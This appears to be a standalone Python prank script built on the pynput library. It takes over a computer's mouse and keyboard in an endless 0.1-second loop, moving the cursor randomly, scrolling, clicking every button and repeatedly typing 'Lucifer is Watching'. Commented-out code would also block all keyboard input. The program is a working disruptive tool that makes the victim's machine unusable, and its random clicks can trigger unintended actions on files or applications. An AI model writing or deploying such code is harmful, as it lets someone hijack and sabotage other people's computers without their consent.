from pynput.mouse import Button, Controller as mouseController
from pynput.keyboard import Controller as keyboardController
import time
import random
import threading

mouse = mouseController()
keyboard = keyboardController()

def actions():
    rand1 = random.randrange(0,1000)
    rand2 = random.randrange(0,1000)
    mouse.position=(rand1,rand2)
    mouse.scroll(rand2,rand1)
    mouse.click(Button.left,2)
    mouse.click(Button.right,2)
    mouse.click(Button.middle,1)
    #time.sleep(0.1)

    
    keyboard.type("Lucifer is Watching")
    threading.Timer(0.1,actions).start()
    #time.sleep(0.1)

#def on_press_key(key):
#    # Suppress all key presses
#    return False

#def disable_keyboard():
#    # Start listening to keyboard events
#    with keyboard.Listener(on_press=on_press_key) as listener:
#        listener.join()
    
    
#disable_keyboard()
actions()